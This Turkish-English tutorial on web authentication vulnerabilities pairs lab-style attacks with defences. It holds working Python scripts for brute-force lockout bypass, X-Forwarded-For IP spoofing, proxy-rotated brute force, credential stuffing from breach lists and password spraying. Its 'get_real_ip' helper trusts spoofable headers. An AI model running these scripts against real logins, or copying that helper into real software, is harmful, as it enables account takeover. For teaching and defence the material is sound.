# Authentication Vulnerabilities (Kimlik Doğrulama Zafiyetleri)

## Giriş

Authentication (Kimlik Doğrulama) zafiyetleri, web uygulamalarının kullanıcı kimlik doğrulama süreçlerindeki kusurlardan kaynaklanan güvenlik açıklarıdır. Bu zafiyetler, saldırganların yetkisiz erişim elde etmesine, hesap ele geçirmesine ve sistem güvenliğini tehlikeye atmasına olanak sağlar.

## Temel Kavramlar

### Session Management

**Session Lifecycle:**
1. **Session Başlatma:** Kullanıcı ilk kez siteye eriştiğinde
2. **Authentication:** Kullanıcı giriş yaptığında session regenerate edilir
3. **Session Maintenance:** Oturum boyunca session ID korunur
4. **Session Termination:** Çıkış veya timeout ile session sonlandırılır

**Session ve CSRF Token İlişkisi:**
- CSRF token session içerisinde saklanır
- Session değişikliğinde CSRF token da rotate edilir
- Bazı uygulamalar her request/response'da token'ı yeniler

### Cookie Security

**Secure Cookie Attributes:**
```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```

- **HttpOnly:** JavaScript ile erişimi engeller (XSS koruması)
- **Secure:** Sadece HTTPS üzerinde gönderir
- **SameSite:** CSRF saldırılarına karşı koruma
- **Path/Domain:** Cookie'nin geçerli olduğu alanı sınırlar

## Authentication Zafiyeti Türleri

### 1. Username Enumeration

Kullanıcı adı tespiti, uygulamanın mevcut ve mevcut olmayan kullanıcılar için farklı davranış sergilemesi durumudur.

### 2. Brute Force Attacks

Şifre kırma saldırıları, otomatik araçlarla çok sayıda şifre denemesi yapılması tekniğidir.

### 3. Session Management Flaws

Session yönetimindeki kusurlar, session hijacking ve fixation saldırılarına yol açar.

### 4. Password Reset Vulnerabilities

Şifre sıfırlama süreçlerindeki güvenlik açıkları, hesap ele geçirme saldırılarında kullanılır.

## Lab 1: Username Enumeration via Different Responses

### Zafiyet Analizi

**Problem:** Login sisteminin mevcut ve mevcut olmayan kullanıcılar için farklı hata mesajları döndürmesi.

**Vulnerable Backend Logic:**
```python
def authenticate(username, password):
    # 1. Adım: Username kontrolü
    user = database.get_user(username)
    if not user:
        return {"error": "Invalid username"}  # ❌ Username'in mevcut olamadığını ifşa eder
    
    # 2. Adım: Password kontrolü  
    if not verify_password(user.password, password):
        return {"error": "Invalid password"}  # ❌ Username'in mevcut olduğunu ifşa eder
    
    # 3. Adım: Session başlat
    return create_session(user)
```

### Saldırı Metodolojisi

**1. Response Difference Detection:**

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=nonexistent_user&password=test123
```
**Response:**
```json
{"error": "Invalid username"}
```

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=wrong_password
```
**Response:**
```json
{"error": "Invalid password"}
```

**2. Burp Suite ile Automated Testing:**

**Intruder Configuration:**
- Position: Username field
- Attack Type: Sniper
- Payload: Common usernames wordlist

**Grep - Extract Configuration:**
1. Response'larda "Invalid" kelimesini içeren kısmı seçin
2. Bu ayar ile response'lar otomatik kategorize edilir
3. Farklı response'lar kullanıcı mevcut/mevcut değil tespiti sağlar

### Korunma Yöntemleri

**Generic Error Messages:**
```python
def authenticate_secure(username, password):
    user = database.get_user(username)
    
    # Her durumda aynı süre bekle (timing attack prevention)
    time.sleep(random.uniform(0.1, 0.3))
    
    if not user or not verify_password(user.password, password):
        return {"error": "Invalid username or password"}  # ✅ Generic mesaj
    
    return create_session(user)
```

**Rate Limiting:**
```python
from functools import wraps
import time

def rate_limit(max_attempts=5, window=300):  # 5 attempt per 5 minutes
    attempts = {}
    
    def decorator(func):
        @wraps(func)
        def wrapper(request):
            client_ip = get_client_ip(request)
            current_time = time.time()
            
            if client_ip not in attempts:
                attempts[client_ip] = []
            
            # Clean old attempts
            attempts[client_ip] = [t for t in attempts[client_ip] if current_time - t < window]
            
            if len(attempts[client_ip]) >= max_attempts:
                return {"error": "Too many attempts, try again later"}
            
            attempts[client_ip].append(current_time)
            return func(request)
        return wrapper
    return decorator
```

## Lab 2: Broken Brute-Force Protection via IP Block

### Zafiyet Analizi

**Problem:** IP-based brute force korumasının bypass edilebilmesi.

### Bypass Teknikleri

#### 1. Session-based Bypass

**Vulnerability:** Hatalı deneme sayısının session'da tutulması.

```python
# Vulnerable implementation
def login(request):
    session = request.session
    attempts = session.get('login_attempts', 0)
    
    if attempts >= 3:
        return {"error": "Account locked"}
    
    if not authenticate(username, password):
        session['login_attempts'] = attempts + 1
        return {"error": "Invalid credentials"}
```

**Bypass Method:**
```python
import requests

def bypass_session_limit():
    session = requests.Session()
    
    for password in password_list:
        # Her 3 denemede bir session'ı sıfırla
        if password_list.index(password) % 3 == 0:
            session = requests.Session()  # Yeni session
        
        response = session.post('/login', data={
            'username': 'admin',
            'password': password
        })
        
        if "Account locked" not in response.text:
            print(f"Potential password: {password}")
```

#### 2. IP-based Bypass Techniques

**X-Forwarded-For Header Manipulation:**

```http
POST /login HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 192.168.1.100
X-Originating-IP: 10.0.0.1
X-Remote-IP: 172.16.0.1

username=admin&password=test123
```

**Automated IP Rotation:**
```python
def brute_force_with_ip_rotation():
    ip_pool = [f"192.168.1.{i}" for i in range(1, 255)]
    
    for i, password in enumerate(password_list):
        headers = {
            'X-Forwarded-For': ip_pool[i % len(ip_pool)],
            'X-Real-IP': ip_pool[i % len(ip_pool)]
        }
        
        response = requests.post('/login', 
            data={'username': 'admin', 'password': password},
            headers=headers
        )
        
        if response.status_code == 200:
            print(f"Success: {password}")
            break
```

#### 3. Mixed Success/Failure Pattern

**Technique:** Her 2 başarısız denemeden sonra 1 başarılı deneme yapma.

```python
def mixed_pattern_attack():
    known_credentials = [('admin', 'admin123'), ('user', 'password')]
    target_username = 'victim'
    
    attempt_count = 0
    
    for password in password_list:
        if attempt_count % 3 == 2:  # Her 3. denemede
            # Bilinen doğru credential ile giriş yap
            valid_cred = known_credentials[attempt_count % len(known_credentials)]
            requests.post('/login', data={
                'username': valid_cred[0], 
                'password': valid_cred[1]
            })
        else:
            # Hedef username ile deneme yap
            response = requests.post('/login', data={
                'username': target_username,
                'password': password
            })
            
            if "success" in response.text.lower():
                print(f"Password found: {password}")
                break
        
        attempt_count += 1
```

### IP Extraction Methods

**Common Headers for Real IP:**
```python
def get_real_ip(request):
    # Proxy header'ları sırası ile kontrol et
    headers_to_check = [
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_REAL_IP', 
        'HTTP_X_ORIGINATING_IP',
        'HTTP_CF_CONNECTING_IP',  # Cloudflare
        'HTTP_X_CLUSTER_CLIENT_IP',  # AWS ELB
        'HTTP_TRUE_CLIENT_IP',  # Akamai
        'REMOTE_ADDR'  # Son çare
    ]
    
    for header in headers_to_check:
        ip = request.META.get(header)
        if ip:
            # X-Forwarded-For birden fazla IP içerebilir
            if ',' in ip:
                ip = ip.split(',')[0].strip()
            return ip
    
    return request.META.get('REMOTE_ADDR', 'Unknown')
```

### Korunma Yöntemleri

#### 1. Robust Rate Limiting

**Multi-layer Protection:**
```python
import redis
from datetime import datetime, timedelta

class RateLimiter:
    def __init__(self):
        self.redis_client = redis.Redis()
    
    def is_allowed(self, identifier, max_attempts=5, window=300):
        key = f"rate_limit:{identifier}"
        current_time = datetime.now()
        
        # Sliding window implementation
        pipe = self.redis_client.pipeline()
        pipe.zremrangebyscore(key, 0, current_time.timestamp() - window)
        pipe.zcard(key)
        pipe.zadd(key, {str(current_time.timestamp()): current_time.timestamp()})
        pipe.expire(key, window)
        
        results = pipe.execute()
        attempt_count = results[1]
        
        return attempt_count < max_attempts

# Multiple identifier'lar ile korunma
def check_rate_limits(request, username):
    limiter = RateLimiter()
    
    # IP-based limit
    client_ip = get_client_ip(request)
    if not limiter.is_allowed(f"ip:{client_ip}", max_attempts=10, window=600):
        return False
    
    # Username-based limit
    if not limiter.is_allowed(f"user:{username}", max_attempts=5, window=900):
        return False
    
    # Global limit (tüm aplikasyon için)
    if not limiter.is_allowed("global", max_attempts=1000, window=60):
        return False
    
    return True
```

#### 2. CAPTCHA Integration

```python
def login_with_captcha(request):
    username = request.POST.get('username')
    
    # Belirli sayıda hatalı denemeden sonra CAPTCHA zorunlu kıl
    failed_attempts = get_failed_attempts(username)
    
    if failed_attempts >= 3:
        if not verify_captcha(request.POST.get('captcha')):
            return {"error": "Invalid CAPTCHA"}
    
    # Normal authentication flow
    return authenticate_user(username, request.POST.get('password'))
```

#### 3. Account Lockout Policy

```python
class AccountLockout:
    def __init__(self):
        self.redis_client = redis.Redis()
    
    def record_failed_attempt(self, username):
        key = f"failed_attempts:{username}"
        
        # Increment counter
        attempts = self.redis_client.incr(key)
        self.redis_client.expire(key, 1800)  # 30 minutes
        
        # Progressive lockout
        if attempts >= 5:
            lockout_time = min(attempts * 60, 3600)  # Max 1 hour
            self.redis_client.setex(f"locked:{username}", lockout_time, "1")
            
            # Notify security team
            send_security_alert(f"Account {username} locked due to brute force")
    
    def is_locked(self, username):
        return self.redis_client.exists(f"locked:{username}")
    
    def clear_attempts(self, username):
        self.redis_client.delete(f"failed_attempts:{username}")
```

## Advanced Attack Techniques

### 1. Distributed Brute Force

```python
import threading
import queue

def distributed_brute_force():
    # Proxy pool for IP rotation
    proxy_pool = [
        "http://proxy1:8080",
        "http://proxy2:8080", 
        # ... more proxies
    ]
    
    password_queue = queue.Queue()
    for password in password_list:
        password_queue.put(password)
    
    def worker():
        while not password_queue.empty():
            password = password_queue.get()
            proxy = proxy_pool[threading.current_thread().ident % len(proxy_pool)]
            
            try:
                response = requests.post('/login',
                    data={'username': 'admin', 'password': password},
                    proxies={'http': proxy, 'https': proxy},
                    timeout=10
                )
                
                if response.status_code == 200:
                    print(f"SUCCESS: {password}")
                    return
                    
            except Exception as e:
                print(f"Error with {password}: {e}")
            finally:
                password_queue.task_done()
    
    # Multiple threads
    for _ in range(10):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
    
    password_queue.join()
```

### 2. Credential Stuffing

```python
def credential_stuffing_attack():
    # Leaked credential lists
    credential_lists = [
        'rockyou.txt',
        'linkedin_breach.txt',
        'adobe_breach.txt'
    ]
    
    for cred_file in credential_lists:
        with open(cred_file, 'r') as f:
            for line in f:
                if ':' not in line:
                    continue
                    
                username, password = line.strip().split(':', 1)
                
                response = requests.post('/login', data={
                    'username': username,
                    'password': password
                })
                
                if 'dashboard' in response.url:
                    print(f"Valid credentials: {username}:{password}")
                    save_valid_credential(username, password)
```

### 3. Password Spraying

```python
def password_spraying():
    # Common passwords
    common_passwords = [
        'Password123',
        'Welcome123', 
        'Admin123',
        'password',
        '123456',
        'qwerty'
    ]
    
    # Large username list
    usernames = load_username_list()
    
    for password in common_passwords:
        print(f"Trying password: {password}")
        
        for username in usernames:
            response = requests.post('/login', data={
                'username': username,
                'password': password
            })
            
            if response.status_code == 200:
                print(f"SUCCESS: {username}:{password}")
                
            # Delay to avoid rate limiting
            time.sleep(1)
        
        # Longer delay between password attempts
        time.sleep(60)
```

## Monitoring ve Detection

### 1. Security Event Logging

```python
import json
import logging
from datetime import datetime

class SecurityLogger:
    def __init__(self):
        self.logger = logging.getLogger('security')
        handler = logging.handlers.RotatingFileHandler(
            'security.log', maxBytes=10*1024*1024, backupCount=5
        )
        formatter = logging.Formatter('%(asctime)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.INFO)
    
    def log_failed_login(self, username, ip, user_agent):
        event = {
            'event_type': 'failed_login',
            'username': username,
            'ip_address': ip,
            'user_agent': user_agent,
            'timestamp': datetime.now().isoformat()
        }
        self.logger.warning(json.dumps(event))
    
    def log_successful_login(self, username, ip):
        event = {
            'event_type': 'successful_login', 
            'username': username,
            'ip_address': ip,
            'timestamp': datetime.now().isoformat()
        }
        self.logger.info(json.dumps(event))
```

### 2. Anomaly Detection

```python
def detect_brute_force_patterns():
    # Failed login analysis
    recent_failures = get_recent_failed_logins(minutes=10)
    
    # Group by IP
    ip_failures = {}
    for failure in recent_failures:
        ip = failure['ip_address']
        if ip not in ip_failures:
            ip_failures[ip] = []
        ip_failures[ip].append(failure)
    
    # Detect suspicious patterns
    for ip, failures in ip_failures.items():
        if len(failures) > 20:  # Many failures from same IP
            alert_security_team(f"Potential brute force from {ip}")
        
        usernames = [f['username'] for f in failures]
        unique_usernames = set(usernames)
        
        if len(unique_usernames) > 10:  # Many different usernames
            alert_security_team(f"Username enumeration attempt from {ip}")
```

### 3. Real-time Alerting

```python
import smtplib
from email.mime.text import MIMEText

def send_security_alert(message):
    msg = MIMEText(message)
    msg['Subject'] = 'Security Alert'
    msg['From'] = 'security@company.com'
    msg['To'] = 'security-team@company.com'
    
    smtp = smtplib.SMTP('localhost')
    smtp.send_message(msg)
    smtp.quit()

def real_time_monitoring():
    suspicious_ips = set()
    
    while True:
        # Check for rapid login attempts
        recent_attempts = get_login_attempts(last_seconds=60)
        
        for ip, attempts in recent_attempts.items():
            if len(attempts) > 10 and ip not in suspicious_ips:
                send_security_alert(f"Rapid login attempts from {ip}")
                suspicious_ips.add(ip)
                
                # Auto-block suspicious IP
                block_ip_temporarily(ip, duration=1800)  # 30 minutes
        
        time.sleep(30)  # Check every 30 seconds
```

## Kaynaklar

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)
- [PortSwigger Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)
- [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)